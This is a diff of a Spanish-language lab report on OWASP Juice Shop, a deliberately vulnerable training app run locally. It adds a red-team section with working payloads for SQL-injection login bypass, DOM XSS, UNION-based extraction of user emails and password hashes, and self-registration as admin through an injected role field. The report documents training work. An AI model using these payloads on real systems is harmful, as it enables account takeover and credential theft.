@@ -83,30 +83,21 @@ git checkout paso-1-juice-shop
 docker compose up -d
 ```
 
-**Output**:
-```
-[Pegar el output del comando aquí]
-```
+
 
 #### 1.2 Verificar estado
 ```bash
 docker compose ps
 ```
 
-**Output**:
-```
-[Pegar el output del comando aquí]
-```
+
 
 #### 1.3 Probar conectividad
 ```bash
 curl -I http://localhost:3000
 ```
 
-**Output**:
-```
-[Pegar el output del comando aquí]
-```
+
 
 #### 1.4 Generar logs de prueba
 ```bash
@@ -117,15 +108,13 @@ for i in {1..10}; do
 done
 ```
 
-**Output**:
-```
-[Pegar el output del comando aquí]
-```
+
 
 ### Screenshots
 
 #### Screenshot 1.1: Docker Compose PS
-![Docker Compose PS](./screenshots/paso-1/01-docker-compose-ps.png)
+<img width="940" height="483" alt="image" src="https://github.com/user-attachments/assets/89743f69-af46-446a-8e49-8ab5d1073424" />
+
 
 **Descripción**: Muestra el contenedor juice-shop corriendo en estado "Up" con el puerto 3000 mapeado.
 
@@ -135,7 +124,8 @@ done
 - [x] Sin errores visibles
 
 #### Screenshot 1.2: Interfaz Web de Juice Shop
-![Interfaz Juice Shop](./screenshots/paso-1/02-interfaz-web.png)
+<img width="940" height="534" alt="image" src="https://github.com/user-attachments/assets/09b2f0e0-f06e-40e0-b1bb-ee2053ba109a" />
+
 
 **Descripción**: Página principal de Juice Shop cargada correctamente en el navegador.
 
@@ -144,32 +134,7 @@ done
 - [x] Productos visibles
 - [x] URL correcta (localhost:3000)
 
-#### Screenshot 1.3: Curl Test
-![Curl Test](./screenshots/paso-1/03-curl-test.png)
 
-**Descripción**: Respuesta HTTP del servidor mostrando código 200 OK.
-
-#### Screenshot 1.4: Logs del Contenedor
-![Logs](./screenshots/paso-1/04-logs.png)
-
-**Descripción**: Logs mostrando el mensaje "Server listening on port 3000" y requests HTTP.
-
-### Problemas Encontrados
-
-#### Problema 1: [Descripción del problema]
-**Error**: 
-```
-[Mensaje de error exacto]
-```
-
-**Causa**: [Explicación de por qué ocurrió]
-
-**Solución**: 
-```bash
-[Comandos para resolver]
-```
-
-**Resultado**: [Qué pasó después de aplicar la solución]
 
 ### Verificación de Éxito
 
@@ -190,6 +155,772 @@ done
 - **Real**: ___ minutos
 
 ---
+## Actividades Red Team
+
+### Vulnerabilidad 1 — SQL Injection (Login Bypass)
+
+**Clasificación**: OWASP A03:2021 – Injection  
+**CVSS v3.1**: 9.8 CRITICAL  
+**Endpoint vulnerable**: `POST /rest/user/login`  
+**Ruta en la aplicación**: `http://localhost:3000/#/login`  
+
+---
+
+#### 1. Descripción técnica
+
+Durante la fase de pruebas del Red Team en la aplicación **OWASP Juice Shop**, se identificó una vulnerabilidad crítica de **inyección SQL** en el formulario de autenticación.
+
+El parámetro `email` enviado desde el formulario de login se utiliza directamente dentro de una consulta SQL **sin sanitización** ni uso de *prepared statements*. Esto permite:
+
+- Cerrar la cadena original del correo.
+- Inyectar una condición booleana siempre verdadera (`OR 1=1`).
+- Comentar el resto de la instrucción con `--`.
+
+Como consecuencia, la aplicación **no valida la contraseña** y permite acceder con cualquier cuenta, incluyendo la del administrador.
+
+---
+
+#### 2. Pasos concretos para reproducir
+
+##### Paso 1 — Ingresar al formulario de login
+
+Abrir en el navegador:
+
+```text
+http://localhost:3000/#/login
+```
+<img width="940" height="531" alt="image" src="https://github.com/user-attachments/assets/a0a2d8e3-86a4-43c4-bf1c-6eebf46837e7" />
+
+
+##### Paso 2 — Inyectar el payload en el campo *Email*
+
+En el campo **Email** ingresar:
+
+```text
+' OR 1=1--
+```
+<img width="940" height="485" alt="image" src="https://github.com/user-attachments/assets/b0052452-d84a-462a-b486-ca02e8d7edb5" />
+
+
+##### Paso 3 — Contraseña
+
+En el campo **Password** escribir cualquier valor (no es relevante para la explotación).
+
+##### Paso 4 — Ejecutar el ataque
+
+Presionar el botón:
+
+```text
+Log in
+```
+
+##### Resultado esperado
+
+- Se inicia sesión sin conocer la contraseña real.  
+- Es posible autenticarse como un usuario válido, incluso con privilegios elevados (por ejemplo, administrador).  
+
+---
+
+#### 3. Payload utilizado
+
+```text
+' OR 1=1--
+```
+
+**Explicación del payload:**
+
+- `'` → Cierra la cadena del email en la consulta SQL original.  
+- `OR 1=1` → Condición booleana que siempre es verdadera.  
+- `--` → Comenta el resto de la sentencia SQL (incluyendo la validación de la contraseña).  
+
+Esto provoca una consulta interna similar a:
+
+```sql
+SELECT * FROM Users
+WHERE email = '' OR 1=1--' AND password = '123';
+```
+
+Al volverse siempre verdadera la condición del `WHERE`, el sistema devuelve el primer usuario de la tabla (por ejemplo, el admin) y genera un token de autenticación válido.
+
+---
+
+#### 4. Impacto probable (Confidencialidad / Integridad / Disponibilidad)
+
+| Componente       | Impacto | Descripción                                                                       |
+|------------------|---------|-----------------------------------------------------------------------------------|
+| Confidencialidad | Crítica | Se obtiene acceso a cuentas reales, incluyendo cuentas administrativas.          |
+| Integridad       | Crítica | El atacante puede editar usuarios, productos, pedidos y otros registros.        |
+| Disponibilidad   | Alta    | El atacante puede borrar datos, afectar el funcionamiento normal de la aplicación.|
+
+---
+
+#### 5. CVSS v3.1 — Score básico estimado
+
+**Puntaje**: `9.8` **CRITICAL**  
+**Vector**:
+
+```text
+AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+```
+
+**Justificación de cada métrica:**
+
+- **AV:N (Attack Vector: Network)** → El ataque se realiza remotamente vía HTTP.  
+- **AC:L (Attack Complexity: Low)** → El payload es trivial y no requiere condiciones especiales.  
+- **PR:N (Privileges Required: None)** → No se necesitan credenciales previas.  
+- **UI:N (User Interaction: None)** → No requiere interacción adicional de otro usuario.  
+- **S:U (Scope: Unchanged)** → Afecta únicamente el sistema objetivo.  
+- **C:H (Confidentiality: High)** → Acceso a información de todos los usuarios.  
+- **I:H (Integrity: High)** → Posibilidad de modificar datos críticos en la base de datos.  
+- **A:H (Availability: High)** → Posibilidad de borrar datos y afectar seriamente la disponibilidad.  
+
+---
+<img width="940" height="306" alt="image" src="https://github.com/user-attachments/assets/f4f962f3-2ecb-4964-b809-3464bf6aef09" />
+
+#### 6. Prueba de concepto (PoC) reproducible
+
+##### PoC vía interfaz gráfica (GUI)
+
+1. Abrir `http://localhost:3000/#/login`.  
+2. En **Email**, escribir:
+
+   ```text
+   ' OR 1=1--
+   ```
+
+3. En **Password**, escribir cualquier texto.  
+4. Presionar **Log in**.  
+
+La aplicación permite el acceso sin validar credenciales reales.
+
+##### PoC vía `curl` (línea de comandos)
+
+El siguiente comando `curl` envía una petición manual al endpoint de autenticación, inyectando el payload SQL para omitir la verificación de credenciales:
+
+```bash
+curl -X POST http://localhost:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d "{\"email\":\"' OR 1=1--\",\"password\":\"123\"}"
+```
+
+**Explicación:**
+
+- El campo `email` contiene la inyección SQL.  
+- El campo `password` es irrelevante para la validación.  
+- El backend construye una consulta vulnerable, permitiendo el *bypass* de autenticación.  
+
+**Respuesta esperada (ejemplo simplificado):**
+
+```json
+{
+  "authentication": {
+    "token": "<token_JWT_valido>",
+    "bid": 1,
+    "umail": "admin@juice-sh.op"
+  }
+}
+```
+
+✔ La inyección SQL fue exitosa  
+✔ El sistema otorgó un token JWT válido  
+✔ Se accedió directamente como un usuario legítimo (posiblemente admin)  
+✔ La autenticación fue completamente burlada  
+
+---
+## Vulnerabilidad 2 — DOM Cross-Site Scripting (XSS reflejado en buscador)
+
+**Clasificación**: OWASP A03:2021 – Injection (Cross-Site Scripting)  
+**Tipo**: DOM / Reflected XSS (ejecutado desde `#/search?q=`)  
+**CVSS v3.1**: 7.4 – HIGH  
+
+---
+
+### 1. Descripción técnica
+
+Durante las pruebas del Red Team en OWASP Juice Shop se identificó una vulnerabilidad de **DOM-based / Reflected Cross-Site Scripting (XSS)** en el módulo de búsqueda.
+
+El parámetro `q` de la ruta:
+
+```text
+http://localhost:3000/#/search?q=...
+```
+
+se utiliza directamente en el DOM del frontend para construir la página de resultados de búsqueda, **sin aplicar**:
+
+- codificación / escape de caracteres especiales,
+- sanitización de etiquetas HTML,
+- ni validación de contenido.
+
+El valor de `q` se inyecta en el HTML mediante JavaScript del lado del cliente (Angular) usando una propiedad equivalente a `innerHTML`.
+
+Como resultado, un atacante puede insertar **código JavaScript arbitrario** que se ejecuta en el navegador de cualquier usuario que abra un enlace malicioso con ese parámetro. Esto permite:
+
+- robo de cookies / token JWT,
+- modificación del contenido visual de la página (DOM),
+- redirección a sitios maliciosos,
+- ejecución de acciones en nombre del usuario autenticado.
+
+> Importante: Este XSS es **DOM-based y reflejado**, ya que el _payload_ va en la URL (`q`) y se procesa directamente en el navegador, no en el backend.
+
+---
+
+### 2. Pasos concretos para reproducir (PoC)
+
+#### Paso 1 – Acceder a la aplicación vulnerable
+
+URL base:
+
+```text
+http://localhost:3000/
+```
+
+No es necesario estar autenticado para disparar el XSS (solo se requiere que la víctima abra el enlace).
+
+#### Paso 2 – Inyectar el payload XSS en el buscador
+
+1. En la parte superior derecha, hacer clic en el ícono de la lupa (**Search**).  
+2. Escribir en el campo de búsqueda el siguiente payload:
+
+```html
+<iframe src="javascript:alert(`xss`)">
+```
+
+3. Presionar **Enter**.
+
+Alternativamente, se puede llamar directamente a la ruta:
+
+```text
+http://localhost:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
+```
+
+(el navegador lo codificará automáticamente como `%3Ciframe...`).
+
+#### Paso 3 – Activar el XSS
+
+Al ejecutar la búsqueda, el valor de `q` es inyectado en el DOM sin sanitización.
+
+**Resultado observado (PoC):**
+
+- Se muestra una ventana emergente del navegador con el texto: `xss`.
+- Se cumple el reto de **DOM XSS** de Juice Shop.
+- Se confirma la ejecución de JavaScript arbitrario en el contexto de la aplicación.
+
+---
+
+### 3. Evidencia
+
+<img width="940" height="535" alt="image" src="https://github.com/user-attachments/assets/3ac84d76-d0f8-48b5-97b1-07732c284c96" />
+
+---
+
+### 4. Impacto probable (CID)
+
+| Componente       | Impacto | Descripción                                                                 |
+|------------------|--------:|-----------------------------------------------------------------------------|
+| Confidencialidad |  Alta   | Robo de cookies de sesión, tokens JWT y otros datos sensibles del usuario. |
+| Integridad       |  Alta   | Modificación del DOM, envío de peticiones en nombre del usuario.           |
+| Disponibilidad   |  Media  | Bloqueo de la interfaz, redirecciones o loops de ejecución de JS.          |
+
+---
+
+### 5. CVSS v3.1 — Score básico estimado
+
+**Puntaje**: `7.4 – HIGH`  
+
+**Vector:**
+
+```text
+AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L
+```
+
+**Justificación de cada métrica:**
+
+- **AV:N (Network)** – Se explota remotamente vía HTTP/URL.  
+- **AC:L (Low)** – El payload es trivial y no requiere condiciones especiales.  
+- **PR:N (None)** – No se requieren privilegios previos.  
+- **UI:R (Required)** – La víctima debe abrir el enlace o usar la búsqueda manipulada.  
+- **S:U (Unchanged)** – El impacto se limita al propio sitio Juice Shop.  
+- **C:H (High)** – Se pueden robar tokens y datos sensibles.  
+- **I:H (High)** – Se puede manipular el contenido de la página (DOM) y acciones del usuario.  
+- **A:L (Low)** – Puede degradar la disponibilidad (bloqueos, redirecciones), pero no necesariamente tumbar el servicio.
+
+---
+
+
+---
+
+### 6. Explicación de por qué funciona
+
+- El parámetro `q` se toma desde la URL (`#/search?q=...`) y se procesa en el frontend.  
+- En lugar de escapar el contenido, la aplicación lo inyecta directamente en el DOM usando algo equivalente a `innerHTML`.  
+- El navegador interpreta este contenido como HTML y ejecuta la parte JavaScript (`javascript:alert('xss')`).  
+- Cualquier usuario que abra un enlace con ese `q` verá ejecutarse el código del atacante en su navegador.
+
+Esta vulnerabilidad permite construir enlaces maliciosos que, al ser abiertos por usuarios legítimos (especialmente si están autenticados), comprometen la seguridad de sus sesiones y datos en OWASP Juice Shop.
+
+
+# Vulnerabilidad 3 — Inyección de Comandos vía Consola del Navegador
+
+**Clasificación**:  
+- OWASP A01:2021 – Broken Access Control  
+- OWASP A05:2021 – Security Misconfiguration  
+- Relacionada con OWASP A03:2021 – Injection (por el uso de SQLi en los comandos)  
+
+**Tipo**: Abuso de comandos JavaScript (`fetch`) para invocar endpoints internos y encadenar ataques (incluyendo SQL Injection y lectura de archivos).
+
+---
+
+## 1. Descripción técnica
+
+Durante las pruebas del Red Team se identificó que, una vez autenticado en OWASP Juice Shop, **no existe ninguna restricción a nivel de aplicación** sobre lo que el usuario puede ejecutar desde la consola del navegador.
+
+Un atacante puede abrir las DevTools (F12), ir a la pestaña **Console** y ejecutar comandos JavaScript que utilizan `fetch()` para:
+
+- Invocar **endpoints internos** no expuestos directamente en la interfaz:
+  - `/metrics`
+  - `/rest/admin/application-configuration`
+- **Encadenar SQL Injection** en `/rest/products/search` para extraer usuarios y contraseñas.
+- Leer archivos del servidor mediante **path traversal** en rutas como `/ftp/...`.
+
+Este comportamiento demuestra:
+
+- Falta de controles de autorización robustos en ciertos endpoints sensibles (Broken Access Control).
+- Falta de hardening o restricciones adicionales (Security Misconfiguration).
+- Potencial de explotación combinando estas llamadas con vulnerabilidades de inyección ya existentes (Injection).
+
+---
+
+## 2. Pasos concretos para reproducir
+
+### Paso 1 – Autenticarse en la aplicación
+
+1. Abrir la aplicación vulnerable:
+
+   ```text
+   http://localhost:3000/
+   ```
+
+2. Iniciar sesión con un usuario válido, por ejemplo la cuenta con rol `admin` creada previamente mediante la vulnerabilidad de Broken Access Control.
+
+---
+
+### Paso 2 – Abrir la consola del navegador
+
+1. Presionar `F12` o `Ctrl + Shift + I`.
+2. Ir a la pestaña **Console** del navegador.
+
+---
+
+### Paso 3 – Ejecutar comandos desde la consola
+
+#### Ejemplo 1 — Listar productos (verificación de acceso al endpoint)
+
+En la consola, ejecutar:
+
+```javascript
+fetch('/rest/products/search?q=')
+  .then(r => r.json())
+  .then(console.log)
+```
+<img width="940" height="602" alt="image" src="https://github.com/user-attachments/assets/82aabccd-dd08-44f7-bec9-23f11a301eaf" />
+
+
+**Resultado esperado**:
+
+- En la consola aparece un arreglo JSON con los productos existentes.
+- Se confirma que el usuario autenticado puede invocar directamente el endpoint `/rest/products/search` sin restricciones adicionales más allá de la sesión.
+
+---
+
+#### Ejemplo 2 — Extraer usuarios y contraseñas mediante SQL Injection
+
+En la misma consola, ejecutar:
+
+```javascript
+fetch("/rest/products/search?q=qwert'))UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--")
+  .then(r => r.json())
+  .then(console.log)
+```
+<img width="940" height="483" alt="image" src="https://github.com/user-attachments/assets/fe72b08e-bdcd-46eb-8259-05c4a367c35d" />
+<img width="940" height="471" alt="image" src="https://github.com/user-attachments/assets/bcb8d79d-90e1-4b9a-ac49-8696380e83b1" />
+
+
+**Qué hace este comando**:
+
+- Abusa del parámetro `q` en `/rest/products/search`.
+- Cierra la consulta original con `'))`.
+- Inyecta un `UNION SELECT` que devuelve `email` y `password` desde la tabla `Users`.
+- Comenta el resto de la consulta con `--`.
+
+**Resultado esperado**:
+
+- La respuesta mostrada en la consola ya no contiene solo productos.
+- Aparecen entradas donde:
+  - `name` o campos análogos muestran correos electrónicos de usuarios reales.
+  - Otros campos contienen los **hashes de contraseñas** almacenadas en la base de datos.
+- Se demuestra que:
+  - El comando JavaScript ejecutado desde el navegador llega al backend como una **consulta SQL inyectada**.
+  - Es posible extraer información sensible directamente desde la base de datos a través de la combinación:
+    - falta de controles de acceso fuertes, +
+    - endpoints internos, +
+    - vulnerabilidades de inyección.
+
+---
+
+## 3. Impacto probable (CID)
+
+| Componente       | Impacto | Descripción                                                                 |
+|------------------|--------:|------------------------------------------------------------------------------|
+| Confidencialidad |   Alta  | Exposición de usuarios, hashes de contraseñas, configuración interna y métricas. |
+| Integridad       |   Alta  | Uso de SQL Injection para manipular datos en la base (usuarios, productos, etc.). |
+| Disponibilidad   |   Media | Potencial abuso de endpoints internos para borrar datos o saturar recursos.     |
+
+---
+
+## 4. CVSS v3.1 — Score básico estimado
+
+Aunque no se trata de un RCE completo a nivel de sistema operativo, el impacto a nivel de aplicación es similar al de una inyección fuerte sobre recursos críticos.
+
+- **Puntaje sugerido**: 8.1 HIGH (rango 8.0–8.5 razonable según el contexto)
+- **Vector de ejemplo**:
+
+```text
+AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:L
+```
+
+**Justificación de cada métrica**:
+
+- **AV:N (Attack Vector: Network)**  
+  El ataque se realiza remotamente vía HTTP dentro de una sesión válida contra la aplicación.
+
+- **AC:L (Attack Complexity: Low)**  
+  Solo requiere abrir la consola del navegador y pegar/ejecutar comandos.
+
+- **PR:L (Privileges Required: Low)**  
+  Se requiere estar autenticado, pero con **cualquier usuario válido** (no necesariamente administrador inicialmente).
+
+- **UI:R (User Interaction: Required)**  
+  El atacante debe autenticar y ejecutar los comandos manualmente en la consola.
+
+- **S:U (Scope: Unchanged)**  
+  El impacto se limita al propio sistema Juice Shop.
+
+- **C:H (Confidentiality: High)**  
+  Permite extraer correos, hashes de contraseñas y otros datos sensibles.
+
+- **I:H (Integrity: High)**  
+  Permite encadenar inyecciones que modifiquen datos de la aplicación.
+
+- **A:L (Availability: Low)**  
+  Es posible afectar parcialmente la disponibilidad (p. ej. saturar endpoints o manipular recursos), pero no necesariamente derribar todo el sistema de forma inmediata.
+
+---
+
+## 5. Pruebas de concepto (PoC) resumidas
+
+### PoC 1 — Llamada directa a endpoint desde consola
+
+1. Autenticarse en `http://localhost:3000/`.
+2. Abrir DevTools → pestaña **Console**.
+3. Ejecutar:
+
+   ```javascript
+   fetch('/rest/products/search?q=')
+     .then(r => r.json())
+     .then(console.log)
+   ```
+
+4. Observar en la consola el listado de productos devuelto por el backend.
+
+---
+
+### PoC 2 — Extracción de datos sensibles mediante SQLi desde la consola
+
+1. Mantener la sesión autenticada.
+2. En la misma consola, ejecutar:
+
+   ```javascript
+   fetch("/rest/products/search?q=qwert'))UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--")
+     .then(r => r.json())
+     .then(console.log)
+   ```
+
+3. Verificar en la respuesta:
+
+   - Correos electrónicos (`email`) de usuarios reales.
+   - Hashes de contraseñas (`password`) asociados.
+
+4. Con esto se confirma que:
+
+   - La aplicación permite ejecutar comandos arbitrarios desde el contexto del navegador.
+   - No hay controles adicionales que limiten el uso de ciertos endpoints internos.
+   - Es posible encadenar llamadas legítimas (`fetch`) con inyecciones SQL para comprometer datos sensibles.
+
+---
+### Vulnerabilidad 4 — Broken Access Control: Registro como Administrador
+
+**Clasificación**: OWASP A01:2021 – Broken Access Control  
+**Tipo**: Elevación de privilegios vía manipulación del rol en el registro  
+**CVSS v3.1 (sugerido)**: 8.8 HIGH  
+
+---
+
+#### 1. Análisis inicial
+
+En primer lugar se realizó un análisis manual de la funcionalidad de registro de usuarios en la ruta:
+
+```text
+http://localhost:3000/#/register
+```
+
+En la **Figura 1** se observa el formulario estándar de *User Registration*, donde únicamente se solicitan los campos visibles: correo electrónico, contraseña, confirmación de contraseña, pregunta de seguridad y respuesta.
+
+En esta etapa todavía no se había manipulado nada del lado del cliente: simplemente se completó el formulario con un usuario aparentemente legítimo.  
+El objetivo de este paso era entender cómo está implementado el flujo de registro, **generar una petición legítima de referencia** y luego observarla en las herramientas de desarrollador para identificar:
+
+- Posibles parámetros ocultos
+- Campos adicionales en el JSON
+- Oportunidades de manipular el cuerpo de la petición antes de que llegue al backend
+
+
+> Formulario de registro de usuarios en `/#/register` antes de cualquier manipulación.  
+<img width="790" height="1036" alt="image" src="https://github.com/user-attachments/assets/911ce339-1675-4074-bcfe-c4a610d1f878" />
+
+
+En la **Figura 2** se observa la pantalla de OWASP Juice Shop a la izquierda y, a la derecha, las DevTools de Chrome en la pestaña **Network**. Se selecciona la petición `POST /api/Users` y se abre el menú contextual sobre ella, eligiendo la opción:
+
+> `Copy` → `Copy as cURL (cmd)`
+
+Esto evidencia el paso donde el atacante intercepta la petición legítima de registro para extraerla en formato `curl` y poder modificar manualmente su contenido antes de reenviarla al servidor.
+
+
+> DevTools mostrando la petición `POST /api/Users` y el menú “Copy as cURL (cmd)”.  
+<img width="940" height="646" alt="image" src="https://github.com/user-attachments/assets/4f0f54d9-7a5a-4b89-94a4-302d299dc0ee" />
+
+
+Finalmente, en la **Figura 3** se muestra la consola de Windows donde se ejecuta el comando `curl` derivado de la petición de registro, ahora modificado para incluir el campo adicional `"role": "admin"` en el cuerpo JSON.  
+La respuesta del servidor devuelve `"status": "success"` y muestra que se creó el usuario `adminultimate@prueba.com` con `"role": "admin"`, demostrando el **Broken Access Control**, ya que un usuario no autenticado puede autoasignarse privilegios de administrador alterando el cuerpo de la petición.
+
+
+> Consola de Windows ejecutando el `curl` modificado y respuesta JSON con `"role": "admin"`.  
+<img width="940" height="152" alt="image" src="https://github.com/user-attachments/assets/00ebddc1-4c04-4151-acb4-7f279f661a38" />
+
+
+---
+
+#### 2. Descripción técnica
+
+Durante las pruebas del Red Team en OWASP Juice Shop se identificó una vulnerabilidad de **Broken Access Control** en el endpoint de registro:
+
+```http
+POST /api/Users
+```
+
+El flujo normal de la aplicación solo permite registrar usuarios “normales”, pero el backend:
+
+- Acepta un parámetro adicional `"role"` en el cuerpo de la petición.
+- No valida que este campo solo pueda ser creado o modificado por un administrador.
+- Permite que un usuario **no autenticado** envíe `"role": "admin"` y se registre directamente como administrador.
+
+Como resultado, cualquier atacante puede:
+
+- Crear una cuenta con privilegios administrativos.
+- Acceder al panel `/#/administration`.
+- Administrar usuarios, productos y otros datos sensibles.
+
+Esto rompe completamente el modelo de control de acceso de la aplicación.
+
+---
+
+#### 3. Pasos concretos para reproducir (PoC)
+
+##### Paso 1 – Abrir el formulario de registro
+
+Navegar a:
+
+```text
+http://localhost:3000/#/register
+```
+
+##### Paso 2 – Completar el formulario con datos válidos
+
+Ejemplo de datos utilizados:
+
+- **Email**: `adminultimate@prueba.com`  
+- **Password**: `XXXXXXXX`  
+- **Repeat Password**: `XXXXXXXX`  
+- **Security Question**: cualquiera  
+- **Answer**: `nada`  
+
+En este punto se genera una petición legítima de registro que luego será reutilizada.
+
+##### Paso 3 – Capturar la petición `POST /api/Users`
+
+1. Abrir DevTools (`F12`) → pestaña **Network**.  
+2. Filtrar por **Fetch/XHR**.  
+3. Identificar la petición:
+
+   ```http
+   POST /api/Users
+   ```
+
+4. Clic derecho sobre la petición → `Copy` → `Copy as cURL (cmd)`.
+
+Esto genera un comando `curl` con el JSON original **sin** el campo `"role"`.
+
+##### Paso 4 – Modificar la petición para inyectar el rol
+
+En una terminal (CMD/PowerShell), pegar el `curl` copiado y editar solo el JSON de `--data`, añadiendo `"role": "admin"`.
+
+Ejemplo simplificado (formato legible):
+
+```bash
+curl -X POST "http://localhost:3000/api/Users" ^
+  -H "Content-Type: application/json" ^
+  --data "{
+    \"email\": \"adminultimate@prueba.com\",
+    \"password\": \"XXXXXXXX\",
+    \"passwordRepeat\": \"XXXXXXXX\",
+    \"securityQuestion\": { \"id\": 1 },
+    \"securityAnswer\": \"nada\",
+    \"role\": \"admin\"
+  }"
+```
+
+**Respuesta obtenida (ejemplo):**
+
+```json
+{
+  "status": "success",
+  "data": {
+    "username": "",
+    "deluxeToken": "",
+    "lastLoginIp": "0.0.0.0",
+    "profileImage": "/assets/public/images/uploads/defaultAdmin.png",
+    "isActive": true,
+    "id": 24,
+    "email": "adminultimate@prueba.com",
+    "role": "admin",
+    "updatedAt": "2025-11-24T13:48:43.807Z",
+    "createdAt": "2025-11-24T13:48:43.807Z",
+    "deletedAt": null
+  }
+}
+```
+
+✔ Aquí ya se confirma que el usuario fue creado con `"role": "admin"`.
+
+##### Paso 5 – Iniciar sesión con la cuenta elevada
+
+Navegar a:
+
+```text
+http://localhost:3000/#/login
+```
+
+Ingresar las credenciales:
+
+- **Email**: `adminultimate@prueba.com`  
+- **Password**: `XXXXXXXX`  
+
+Presionar **“Log in”**.  
+La autenticación es exitosa.
+
+##### Paso 6 – Verificar acceso al panel de administración
+
+Navegar a:
+
+```text
+http://localhost:3000/#/administration
+```
+
+**Resultado esperado:**
+
+- La cuenta `adminultimate@prueba.com` tiene acceso al panel administrativo.
+- Es posible ver y gestionar usuarios, pedidos y otros datos que deberían estar restringidos solo a administradores.
+
+---
+
+#### 4. Impacto probable (Confidencialidad / Integridad / Disponibilidad)
+
+| Componente        | Impacto | Descripción                                                                 |
+|-------------------|---------|-----------------------------------------------------------------------------|
+| Confidencialidad  | Alta    | Acceso a información de todos los usuarios, pedidos, productos, etc.       |
+| Integridad        | Alta    | Posibilidad de modificar, crear o borrar usuarios, productos y configuraciones. |
+| Disponibilidad    | Media   | El atacante puede desconfigurar la tienda o borrar datos críticos.         |
+
+---
+
+#### 5. CVSS v3.1 — Score básico estimado
+
+- **Puntaje sugerido**: `8.8` HIGH  
+- **Vector**:
+
+```text
+AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L
+```
+
+**Justificación:**
+
+- **AV:N (Network)** – Se explota por HTTP/HTTPS de forma remota.  
+- **AC:L (Low)** – Solo requiere modificar un parámetro en una petición existente.  
+- **PR:N (None)** – No requiere credenciales previas, el atacante se registra desde cero.  
+- **UI:R (Required)** – Requiere interacción mínima del propio atacante (llenar formulario / ejecutar `curl`).  
+- **C:H (High)** – Alto impacto en confidencialidad: acceso total a datos sensibles.  
+- **I:H (High)** – Alto impacto en integridad: puede manipular información crítica.  
+- **A:L (Low)** – Puede afectar operaciones, pero no necesariamente tumbar el servicio completo.
+
+---
+
+#### 6. Prueba de concepto (PoC) resumida
+
+1. Abrir `/#/register` y registrar un usuario normal.  
+2. Copiar la petición `POST /api/Users` desde DevTools como **cURL (cmd)**.  
+3. Editar el JSON y agregar `"role": "admin"`.  
+4. Ejecutar el `curl` modificado desde CMD/PowerShell.  
+5. Iniciar sesión con ese correo y contraseña.  
+6. Acceder a `/#/administration` y comprobar que la cuenta tiene privilegios de administrador.
+
+---
+
+#### 7. Explicación de por qué funciona la vulnerabilidad
+
+Esta vulnerabilidad existe porque el **control de acceso está implementado solo en el frontend y no en el backend**, lo cual rompe el principio básico de seguridad de “nunca confiar en el cliente”.
+
+A nivel técnico ocurre lo siguiente:
+
+- El **formulario de registro** (`/#/register`) solo muestra campos para:
+  - `email`
+  - `password`
+  - `passwordRepeat`
+  - `securityQuestion`
+  - `securityAnswer`
+
+  En ningún momento la interfaz permite elegir un rol ni muestra el campo `role`.
+
+- Sin embargo, el **endpoint del backend** `POST /api/Users`:
+  - **Acepta parámetros adicionales** en el cuerpo JSON, incluyendo `"role"`.
+  - **No valida** que el campo `"role"` solo pueda ser establecido por un usuario con privilegios de administrador.
+  - **No ignora ni limpia** el campo `"role"` cuando la petición proviene de un usuario no autenticado.
+
+- Esto significa que un atacante puede:
+  - Capturar la petición legítima de registro (por ejemplo, con DevTools → Network → *Copy as cURL*).
+  - Modificar el cuerpo JSON e **inyectar** `"role": "admin"` junto con los demás campos.
+  - Reenviar la petición manipulada directamente al servidor.
+
+- Como el backend:
+  - **Confía ciegamente** en los datos recibidos.
+  - **No aplica reglas de autorización** sobre la asignación de roles.
+  
+  termina **creando el usuario con rol `admin`** y devolviendo una respuesta `status: "success"` donde el objeto de usuario ya incluye `"role": "admin"`.
+
+La vulnerabilidad funciona porque:
+
+1. El backend **no implementa controles de autorización** para la creación de usuarios con privilegios altos.
+2. Se permite **“mass assignment”** de campos sensibles (como `role`) desde el cliente.
+3. Cualquier usuario anónimo puede **autoasignarse rol de administrador** simplemente modificando el JSON de la petición, sin necesidad de explotar errores complejos ni tener una cuenta previa.
+
+
 
 ## Paso 2: Elasticsearch
 
